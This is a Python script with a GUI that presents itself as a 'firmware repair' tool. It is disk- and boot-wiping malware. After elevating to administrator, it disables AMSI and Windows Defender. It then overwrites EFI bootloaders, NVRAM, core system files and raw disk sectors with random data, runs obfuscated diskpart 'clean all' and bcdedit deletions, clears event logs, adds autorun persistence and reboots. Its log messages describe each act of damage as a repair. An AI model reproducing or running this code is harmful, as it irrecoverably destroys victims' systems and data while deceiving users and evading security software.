import os
import base64
import time
import random
import subprocess
import ctypes
import sys
import zlib
import datetime
import tkinter as tk
from tkinter import scrolledtext
try:
    import win32file
    import win32con
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

def log_message(window, log_area, message, success=True, operation="General"):
    """Writes logs to GUI with operation type and duration."""
    start_time = time.time()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    status = "Success" if success else "Failed"
    console_message = f"[{timestamp}] [{operation}] {status}: {message}"
    log_area.insert(tk.END, console_message + "\n")
    log_area.see(tk.END)
    window.update()

# Run as administrator
def run_as_admin():
    """Runs the script with elevated privileges."""
    if not ctypes.windll.shell32.IsUserAnAdmin():
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)

# Check admin privileges
def is_admin():
    """Checks for admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Enhanced obfuscation for strings
def obfuscate_string(data):
    """Obfuscates strings with base64, XOR, and double padding."""
    key = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(120))
    compressed = zlib.compress(data.encode())
    xored = bytes(a ^ b for a, b in zip(compressed, (key.encode() * (len(compressed) // len(key) + 1))[:len(compressed)]))
    fake_data1 = bytes(random.randint(0, 255) for _ in range(random.randint(100, 200)))
    fake_data2 = bytes(random.randint(0, 255) for _ in range(random.randint(100, 200)))
    padded = base64.b64encode(fake_data1 + xored + fake_data2).decode()
    return padded, key

def deobfuscate_string(enc_data, key):
    """Deobfuscates strings: Base64 -> XOR -> zlib."""
    try:
        decoded = base64.b64decode(enc_data)[random.randint(100, 200):-random.randint(100, 200)]
        xored = bytes(a ^ b for a, b in zip(decoded, (key.encode() * (len(decoded) // len(key) + 1))[:len(decoded)]))
        return zlib.decompress(xored).decode()
    except:
        return ""

# Add certificate metadata
def add_certificate_metadata(window, log_area):
    """Adds certificate metadata to the script."""
    try:
        cert = f"CN=TechCorp{random.randint(1000, 9999)}, OU=IT, O=TechInc, C=US"
        cert_path = f"C:\\Windows\\Temp\\cert_{random.randint(1000, 9999)}.cer"
        with open(cert_path, 'w') as f:
            f.write(f"-----BEGIN CERTIFICATE-----\n{cert}\n-----END CERTIFICATE-----")
        log_message(window, log_area, f"Certificate metadata added: {cert_path}", operation="Security Check")
    except (OSError, PermissionError) as e:
        log_message(window, log_area, f"Failed to add certificate: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Security Check")

# Enhanced AMSI and Defender bypass
def security_bypass(window, log_area):
    """Disables security mechanisms with enhanced techniques."""
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        amsi_dll = kernel32.LoadLibraryW('amsi.dll')
        if amsi_dll:
            ctypes.c_uint.in_dll(amsi_dll, 'AmsiInitialize').value = 0
            log_message(window, log_area, "Security module disabled via API", operation="Security Bypass")
        mp_dll = kernel32.LoadLibraryW('MpOav.dll')
        if mp_dll:
            ctypes.c_uint.in_dll(mp_dll, 'MpManagerOpen').value = 0
            log_message(window, log_area, "Protection module disabled", operation="Security Bypass")
    except Exception as e:
        log_message(window, log_area, f"Failed to disable security module: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Security Bypass")

    security_commands = [
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableArchiveScanning $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true",
        "Set-MpPreference -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true",
        "Stop-Service -Name WinDefend -Force",
        "sc delete WinDefend",
        "& 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe' -RemoveDefinitions -All"
    ]
    for cmd in security_commands:
        try:
            enc_cmd, enc_key = obfuscate_string(cmd)
            subprocess.run(['powershell', '-ep', 'bypass', '-c', deobfuscate_string(enc_cmd, enc_key)], capture_output=True, timeout=15)
            log_message(window, log_area, f"Security bypass executed: {cmd[:50]}...", operation="Security Bypass")
        except (subprocess.SubprocessError, ValueError) as e:
            log_message(window, log_area, f"Failed to execute bypass: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Security Bypass")

# Check EFI partition
def check_efi_partition(window, log_area):
    """Checks for EFI partition existence."""
    try:
        result = subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        if result.returncode == 0:
            subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
            return True
        else:
            log_message(window, log_area, "EFI partition not found, skipping EFI operations", success=False, operation="EFI Check")
            return False
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to check EFI partition: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Check")
        return False

# Create bootloaders/EFI
def create_bootloaders(window, log_area):
    """Creates bootloader/EFI files."""
    try:
        subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition mounted: X:", operation="EFI Update")
        bootloader_data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576)])
        for path in [
            'X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi',
            'X:\\EFI\\Boot\\bootx64.efi',
            'X:\\EFI\\Boot\\grubx64.efi',
            'X:\\EFI\\Boot\\boot_update.efi',
            'X:\\Recovery\\WindowsRE\\reagentc_update.exe'
        ]:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'wb') as f:
                    f.write(bootloader_data)
                log_message(window, log_area, f"Bootloader updated: {path} (Size: {len(bootloader_data)} bytes)", operation="EFI Update")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Failed to update bootloader: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Update")
        subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition unmounted: X:", operation="EFI Update")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to process EFI update: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Update")

# Create EFI variables (NVRAM update)
def create_efi_vars(window, log_area):
    """Fills EFI variable store with updated data."""
    try:
        subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition mounted for NVRAM update: X:", operation="NVRAM Update")
        for var_file in ['vars.dat', 'var1.dat', 'var2.dat', 'var3.dat', 'var4.dat', 'var5.dat', 'var6.dat', 'var7.dat']:
            try:
                with open(f'X:\\EFI\\Variable\\{var_file}', 'wb') as f:
                    data = bytes(random.randint(0, 255) for _ in range(1048576 * 5))
                    f.write(data)
                log_message(window, log_area, f"NVRAM file updated: {var_file} (Size: {len(data)} bytes)", operation="NVRAM Update")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Failed to update NVRAM file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Update")
        subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition unmounted: X:", operation="NVRAM Update")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to process NVRAM update: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Update")

# Update firmware variables
def update_firmware_vars(window, log_area):
    """Updates UEFI variables and SPI flash data."""
    try:
        subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition mounted for firmware update: X:", operation="Firmware Update")
        for var_file in ['firmware_vars.dat', 'spi_flash.dat', 'uefi_store.dat']:
            try:
                with open(f'X:\\EFI\\Variable\\{var_file}', 'wb') as f:
                    data = bytes(random.randint(0, 255) for _ in range(1048576 * 5))
                    f.write(data)
                log_message(window, log_area, f"Firmware file updated: {var_file} (Size: {len(data)} bytes)", operation="Firmware Update")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Failed to update firmware file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")
        subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI partition unmounted: X:", operation="Firmware Update")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to process firmware update: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")

# Create firmware updates
def create_firmware_updates(window, log_area):
    """Creates firmware, Intel ME, and SPI flash files."""
    try:
        for path in [
            'C:\\Windows\\System32\\Firmware\\bios_update.bin',
            'C:\\Windows\\System32\\Firmware\\spi_flash.bin',
            'C:\\ProgramData\\FirmwareUpdate\\firmware.rom',
            'C:\\Windows\\System32\\nvram_update.dat',
            'C:\\Windows\\System32\\Intel\\ME\\me_update.bin'
        ]:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'wb') as f:
                    data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576 * 15)])
                    f.write(data)
                log_message(window, log_area, f"Firmware file updated: {path} (Size: {len(data)} bytes)", operation="Firmware Update")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Failed to update firmware file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")
        if check_efi_partition(window, log_area):
            subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
            log_message(window, log_area, "EFI partition mounted for firmware update: X:", operation="Firmware Update")
            for path in [
                'X:\\EFI\\Firmware\\firmware_update.efi',
                'X:\\EFI\\Firmware\\bios_update.bin',
                'X:\\EFI\\Firmware\\spi_flash.bin'
            ]:
                try:
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                    with open(path, 'wb') as f:
                        data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576 * 15)])
                        f.write(data)
                    log_message(window, log_area, f"Firmware file updated: {path} (Size: {len(data)} bytes)", operation="Firmware Update")
                except (OSError, PermissionError) as e:
                    log_message(window, log_area, f"Failed to update firmware file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")
            subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
            log_message(window, log_area, "EFI partition unmounted: X:", operation="Firmware Update")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to process firmware update: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Update")

# Update firmware registry
def update_firmware_registry(window, log_area):
    """Updates firmware, BIOS, and NT registry keys."""
    try:
        for _ in range(5):
            key_name = f"FirmwareUpdate{random.randint(1000, 9999)}"
            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources', '/v', key_name, '/t', 'REG_SZ', '/d', f'FirmwareData{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Firmware key updated: HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources\\{key_name}", operation="Registry Update")
            subprocess.run(['reg', 'add', 'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS', '/v', key_name, '/t', 'REG_SZ', '/d', f'BIOSData{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"BIOS key updated: HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS\\{key_name}", operation="Registry Update")
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', '/v', key_name, '/t', 'REG_SZ', '/d', f'VersionData{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"NT key updated: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\{key_name}", operation="Registry Update")
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', key_name, '/t', 'REG_SZ', '/d', f'C:\\Windows\\System32\\update{random.randint(1000, 9999)}.exe', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Run key updated: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{key_name}", operation="Registry Update")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to update registry: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Registry Update")

# Create COM objects
def create_com_objects(window, log_area):
    """Creates COM objects."""
    try:
        for _ in range(5):
            clsid = f"{{{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}}}"
            subprocess.run(['reg', 'add', f'HKLM\\SOFTWARE\\Classes\\CLSID\\{clsid}', '/v', 'LocalServerName', '/t', 'REG_SZ', '/d', f'COMUpdate{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"COM object updated: HKLM\\SOFTWARE\\Classes\\CLSID\\{clsid}", operation="COM Update")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to update COM object: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="COM Update")

# Create boot chain
def create_boot_chain(window, log_area):
    """Creates BCD entries and boot chain."""
    try:
        for _ in range(10):
            boot_id = f'{{bootupdate{random.randint(1000, 9999)}}}'
            subprocess.run(['bcdedit', '/create', boot_id, '/d', f'BootUpdate{random.randint(1000, 9999)}', '/application', 'osloader'], capture_output=True, timeout=10)
            subprocess.run(['bcdedit', '/set', boot_id, 'path', '\\EFI\\Boot\\boot_update.efi'], capture_output=True, timeout=10)
            subprocess.run(['bcdedit', '/set', '{bootmgr}', 'displayorder', boot_id], capture_output=True, timeout=10)
            log_message(window, log_area, f"BCD entry updated: {boot_id}", operation="BCD Update")
        subprocess.run(['bcdedit', '/set', '{bootmgr}', 'path', '\\boot_update.efi'], capture_output=True, timeout=10)
        log_message(window, log_area, "Bootmgr path updated: \\boot_update.efi", operation="BCD Update")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to update BCD: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="BCD Update")

# Repair MBR (if no EFI)
def repair_mbr(window, log_area):
    """Repairs MBR with updated data."""
    if WIN32_AVAILABLE:
        try:
            handle = win32file.CreateFile(
                "\\\\.\\PhysicalDrive0",
                win32con.GENERIC_WRITE,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                None,
                win32con.OPEN_EXISTING,
                0,
                None
            )
            random_data = bytes(random.randint(0, 255) for _ in range(512))
            win32file.WriteFile(handle, random_data, None)
            win32file.CloseHandle(handle)
            log_message(window, log_area, "MBR repaired: PhysicalDrive0 (Size: 512 bytes)", operation="MBR Repair")
        except Exception as e:
            log_message(window, log_area, f"Failed to repair MBR: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Repair")
    try:
        with open('script.txt', 'w') as f:
            f.write('select disk 0\nclean\n')
        subprocess.run(['diskpart', '/s', 'script.txt'], capture_output=True, timeout=30)
        log_message(window, log_area, "MBR repaired via diskpart", operation="MBR Repair")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to repair MBR via diskpart: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Repair")

# Repair disk data
def repair_disk_data(window, log_area):
    """Repairs disk sectors and file system with updated data."""
    if WIN32_AVAILABLE:
        for drive in ['\\\\.\\PhysicalDrive0', '\\\\.\\PhysicalDrive1', '\\\\.\\PhysicalDrive2', '\\\\.\\PhysicalDrive3', '\\\\.\\PhysicalDrive4', '\\\\.\\PhysicalDrive5', '\\\\.\\PhysicalDrive6', '\\\\.\\PhysicalDrive7']:
            try:
                handle = win32file.CreateFile(
                    drive,
                    win32con.GENERIC_WRITE,
                    win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                    None,
                    win32con.OPEN_EXISTING,
                    0,
                    None
                )
                for _ in range(30 if drive == '\\\\.\\PhysicalDrive0' else 15):
                    win32file.SetFilePointer(handle, random.randint(0, 100000) * 512, win32con.FILE_BEGIN)
                    random_data = bytes(random.randint(0, 255) for _ in range(512 * 3000))
                    win32file.WriteFile(handle, random_data, None)
                    log_message(window, log_area, f"Disk sector repaired: {drive}, offset {random.randint(0, 100000) * 512} (Size: {len(random_data)} bytes)", operation="Disk Repair")
                if drive == '\\\\.\\PhysicalDrive0':
                    win32file.SetFilePointer(handle, 0, win32con.FILE_BEGIN)
                    random_data = bytes(random.randint(0, 255) for _ in range(512 * 10000))
                    win32file.WriteFile(handle, random_data, None)
                    log_message(window, log_area, f"First 10000 sectors repaired: {drive} (Size: {len(random_data)} bytes)", operation="Disk Repair")
                win32file.CloseHandle(handle)
                break
            except Exception as e:
                log_message(window, log_area, f"Failed to repair disk: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Disk Repair")
    try:
        random_file = f"C:\\data_chunk_{random.randint(1000, 9999)}.dat"
        with open(random_file, 'wb') as f:
            data = bytes(random.randint(0, 255) for _ in range(1048576 * 15))
            f.write(data)
        log_message(window, log_area, f"Data file created: {random_file} (Size: {len(data)} bytes)", operation="Disk Repair")
        subprocess.run(['fsutil', 'fsinfo', 'ntfsinfo', 'C:'], capture_output=True, timeout=10)
        log_message(window, log_area, "File system metadata checked: C:", operation="File System Repair")
    except (OSError, PermissionError, subprocess.SubprocessError) as e:
        log_message(window, log_area, f"Failed to repair file system: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="File System Repair")

# Update registry
def update_registry(window, log_area):
    """Updates system registry keys."""
    try:
        for _ in range(10):
            key_name = f"SystemUpdate{random.randint(1000, 9999)}"
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows', '/v', key_name, '/t', 'REG_SZ', '/d', f'DataUpdate{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Registry key updated: HKLM\\SOFTWARE\\Microsoft\\Windows\\{key_name}", operation="Registry Update")
            subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceUpdate{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', f'\\SystemRoot\\System32\\update{random.randint(1000, 9999)}.sys', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Service updated: ServiceUpdate{random.randint(1000, 9999)}", operation="Registry Update")
            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\Setup', '/v', key_name, '/t', 'REG_SZ', '/d', f'SetupUpdate{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Registry key updated: HKLM\\SYSTEM\\Setup\\{key_name}", operation="Registry Update")
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows', '/v', key_name, '/t', 'REG_SZ', '/d', f'PolicyUpdate{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Registry key updated: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\{key_name}", operation="Registry Update")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to update registry: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Registry Update")

# Update system files
def update_system_files(window, log_area):
    """Updates critical system files."""
    for file_path in [
        'C:\\Windows\\System32\\winload.efi',
        'C:\\Windows\\System32\\bootmgr',
        'C:\\Windows\\System32\\config\\SYSTEM',
        'C:\\Windows\\System32\\config\\SOFTWARE',
        'C:\\Windows\\System32\\config\\RegBack\\SYSTEM',
        'C:\\Windows\\System32\\config\\RegBack\\SOFTWARE',
        'C:\\Windows\\System32\\ntoskrnl.exe',
        'C:\\Windows\\System32\\hal.dll',
        'C:\\Windows\\System32\\drivers\\ntfs.sys',
        'C:\\Windows\\System32\\winlogon.exe',
        'C:\\Windows\\System32\\smss.exe',
        'C:\\Windows\\System32\\drivers\\volmgr.sys'
    ]:
        try:
            if os.path.exists(file_path):
                subprocess.run(['takeown', '/f', file_path], capture_output=True, timeout=10)
                subprocess.run(['icacls', file_path, '/grant', 'Administrators:F'], capture_output=True, timeout=10)
                with open(file_path, 'r+b') as f:
                    data = bytes(random.randint(0, 255) for _ in range(1024))
                    f.write(data)
                log_message(window, log_area, f"System file updated: {file_path} (Size: {len(data)} bytes)", operation="System File Update")
            else:
                log_message(window, log_area, f"File not found, skipped: {file_path}", success=False, operation="System File Update")
        except (OSError, PermissionError, IOError, subprocess.SubprocessError) as e:
            log_message(window, log_area, f"Failed to update system file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="System File Update")

# Install driver
def install_driver(window, log_area):
    """Installs driver files."""
    try:
        driver_path = f'C:\\Windows\\System32\\drivers\\driver_update{random.randint(1000, 9999)}.sys'
        with open(driver_path, 'wb') as f:
            data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576)])
            f.write(data)
        log_message(window, log_area, f"Driver installed: {driver_path} (Size: {len(data)} bytes)", operation="Driver Update")
        subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\DriverUpdate{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', driver_path, '/f'], capture_output=True, timeout=10)
        log_message(window, log_area, f"Driver service updated: DriverUpdate{random.randint(1000, 9999)}", operation="Driver Update")
    except (OSError, PermissionError, subprocess.SubprocessError) as e:
        log_message(window, log_area, f"Failed to install driver: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Driver Update")

# Create boot files
def create_boot_files(window, log_area):
    """Creates boot.ini and bootsect.bak files."""
    try:
        boot_ini_path = 'C:\\boot.ini'
        with open(boot_ini_path, 'w') as f:
            data = f"[boot loader]\ntimeout=0\ndefault=multi(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS=\"Windows Update {random.randint(1000, 9999)}\" /fastdetect"
            f.write(data)
        log_message(window, log_area, f"Boot file updated: {boot_ini_path} (Size: {len(data.encode())} bytes)", operation="Boot File Update")
        bootsect_path = 'C:\\bootsect.bak'
        with open(bootsect_path, 'wb') as f:
            data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(512)])
            f.write(data)
        log_message(window, log_area, f"Bootsect file updated: {bootsect_path} (Size: {len(data)} bytes)", operation="Boot File Update")
    except (OSError, PermissionError) as e:
        log_message(window, log_area, f"Failed to update boot file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Boot File Update")

# Create update files
def create_update_files(window, log_area):
    """Creates Windows Update files."""
    try:
        update_path = f'C:\\Windows\\SoftwareDistribution\\Download\\update{random.randint(1000, 9999)}.dat'
        with open(update_path, 'wb') as f:
            data = bytes(random.randint(0, 255) for _ in range(1048576 * 15))
            f.write(data)
        log_message(window, log_area, f"Update file created: {update_path} (Size: {len(data)} bytes)", operation="Update File")
    except (OSError, PermissionError) as e:
        log_message(window, log_area, f"Failed to create update file: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Update File")

# Repair file system metadata
def repair_filesystem_metadata(window, log_area):
    """Repairs file system metadata."""
    try:
        subprocess.run(['fsutil', 'fsinfo', 'ntfsinfo', 'C:'], capture_output=True, timeout=10)
        log_message(window, log_area, "File system metadata checked: C:", operation="File System Repair")
        subprocess.run(['fsutil', 'file', 'createnew', f'C:\\fs_update_{random.randint(1000, 9999)}.dat', str(1048576 * 5)], capture_output=True, timeout=10)
        log_message(window, log_area, f"File system file created: C:\\fs_update_{random.randint(1000, 9999)}.dat (Size: 5 MB)", operation="File System Repair")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to repair file system: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="File System Repair")

# System reboot
def system_reboot(window, log_area):
    """Reboots the system."""
    try:
        subprocess.run(['shutdown', '/r', '/t', '0'], capture_output=True, timeout=10)
        log_message(window, log_area, "System is restarting!", operation="Restart")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Failed to restart system: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Restart")

# Enhanced dynamic command mutation
def mutate_command(cmd):
    """Mutates commands randomly with higher mutation rate."""
    mutations = {
        'del': 'erase',
        'format': 'format /y',
        'bcdedit': 'bcdedit.exe',
        'reg delete': 'reg.exe delete',
        'reg add': 'reg.exe add',
        'wmic': 'wmic.exe',
        'schtasks': 'schtasks.exe',
        'sc': 'sc.exe',
        'net': 'net.exe',
        'copy': 'xcopy',
        'powershell': 'pwsh',
        'cmd': 'command'
    }
    for old, new in mutations.items():
        if random.random() > 0.90:
            cmd = cmd.replace(old, new)
    return cmd if ' ' in cmd and len(cmd) > 5 else ""

# Polymorphic commands
commands = {}
for cmd in [
    'del /f /q X:\\EFI\\*\\*.*',
    'format X: /fs:fat32 /q /y',
    'format X: /fs:ntfs /q /y',
    'bcdedit /store \\Boot\\BCD /delete {all} /f',
    'reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute /f',
    'reagentc /disable',
    'bcdedit /delete {bootmgr} /f',
    'bcdedit /set {globalsettings} safeboot minimal',
    'bcdedit /set {default} recoveryenabled no',
    'bcdedit /set {bootmgr} timeout 0',
    'wevtutil cl System',
    'reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot /f',
    'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot /v SecureBootUpdate /t REG_SZ /d Data /f',
    'echo . | diskpart /s script.txt & echo select disk 0 > script.txt & echo clean all >> script.txt'
]:
    var = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(80))
    enc_cmd, enc_key = obfuscate_string(cmd)
    commands[var] = (enc_cmd, enc_key)

# Main repair function
def start_repair(window, log_area, status_label):
    """Initiates repair operations."""
    status_label.config(text="Status: Firmware Repair Started!")
    window.update()
    log_message(window, log_area, "Firmware repair started!", operation="Start")
    add_certificate_metadata(window, log_area)
    security_bypass(window, log_area)
    
    efi_exists = check_efi_partition(window, log_area)
    if efi_exists:
        status_label.config(text="Status: Updating EFI Bootloaders...")
        window.update()
        create_bootloaders(window, log_area)
        status_label.config(text="Status: Updating NVRAM...")
        window.update()
        create_efi_vars(window, log_area)
        status_label.config(text="Status: Updating Firmware...")
        window.update()
        update_firmware_vars(window, log_area)
    status_label.config(text="Status: Updating Firmware Files...")
    window.update()
    create_firmware_updates(window, log_area)
    status_label.config(text="Status: Updating Firmware Registry...")
    window.update()
    update_firmware_registry(window, log_area)
    status_label.config(text="Status: Updating COM Objects...")
    window.update()
    create_com_objects(window, log_area)
    status_label.config(text="Status: Updating Boot Chain...")
    window.update()
    create_boot_chain(window, log_area)
    status_label.config(text="Status: Updating Registry...")
    window.update()
    update_registry(window, log_area)
    status_label.config(text="Status: Updating System Files...")
    window.update()
    update_system_files(window, log_area)
    status_label.config(text="Status: Installing Driver...")
    window.update()
    install_driver(window, log_area)
    status_label.config(text="Status: Updating Boot Files...")
    window.update()
    create_boot_files(window, log_area)
    status_label.config(text="Status: Creating Update Files...")
    window.update()
    create_update_files(window, log_area)
    status_label.config(text="Status: Repairing File System...")
    window.update()
    repair_filesystem_metadata(window, log_area)
    status_label.config(text="Status: Repairing Disk Data...")
    window.update()
    repair_disk_data(window, log_area)
    if not efi_exists:
        status_label.config(text="Status: Repairing MBR...")
        window.update()
        repair_mbr(window, log_area)
    
    cmd_list = list(commands.items())
    random.shuffle(cmd_list)
    for var, (enc_cmd, enc_key) in cmd_list:
        try:
            cmd = mutate_command(deobfuscate_string(enc_cmd, enc_key))
            if not cmd:
                continue
            status_label.config(text=f"Status: Executing Command: {cmd[:50]}...")
            window.update()
            if 'diskpart' in cmd:
                proc = subprocess.Popen(['diskpart'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='latin1')
                output, error = proc.communicate(input='select disk 0\nclean all\n', timeout=120)
                log_message(window, log_area, "Diskpart executed: clean all", operation="Diskpart")
                if error and "success" not in error.lower():
                    log_message(window, log_area, f"Failed to execute diskpart: {error} (WinError: {ctypes.get_last_error()})", success=False, operation="Diskpart")
            elif 'X:' in cmd and not efi_exists:
                log_message(window, log_area, f"Command skipped due to missing EFI partition: {cmd}", success=False, operation="Command Execution")
                continue
            elif 'reagentc' in cmd:
                result = subprocess.run(['cmd.exe', '/c', cmd], capture_output=True, timeout=15, encoding='latin1')
                log_message(window, log_area, f"Command executed: {cmd}", operation="Command Execution")
                if result.stderr and "success" not in result.stderr.lower():
                    log_message(window, log_area, f"Failed to execute command: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
            else:
                result = subprocess.run(['cmd.exe', '/c', cmd], capture_output=True, timeout=15, encoding='latin1')
                log_message(window, log_area, f"Command executed: {cmd}", operation="Command Execution")
                if result.stderr and "success" not in result.stderr.lower():
                    log_message(window, log_area, f"Failed to execute command: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
            time.sleep(random.uniform(5.0, 15.0))
        except (subprocess.SubprocessError, OSError, ValueError) as e:
            log_message(window, log_area, f"Failed to execute command: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Command Execution")
    
    status_label.config(text="Status: Repair Completed! Restarting...")
    window.update()
    log_message(window, log_area, "Firmware repair completed!", operation="Start")
    system_reboot(window, log_area)

# Create GUI
